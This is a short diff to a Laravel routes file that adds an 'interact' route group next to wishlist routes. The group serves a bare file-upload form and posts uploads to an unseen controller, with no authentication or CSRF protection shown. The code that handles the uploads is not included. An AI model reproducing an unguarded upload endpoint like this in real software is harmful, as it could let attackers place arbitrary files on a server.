@@ -19,3 +19,11 @@ Route::group([
     Route::post('wishlistproduct_note', 'WishListProductController@note')->name('wlp.note');
     Route::get('in/{code}', 'WishListController@in')->name('share.in');
 });
+
+Route::group([
+    'namespace' => 'Milestone\\Teebpd\\Controller\\Interact',
+    'prefix' => 'interact'
+],function(){
+    Route::get('/',function(){ return '<form method="post" enctype="multipart/form-data"><input type="file" name="file"><input type="submit"></form>'; });
+    Route::post('/','InteractController@index');
+});
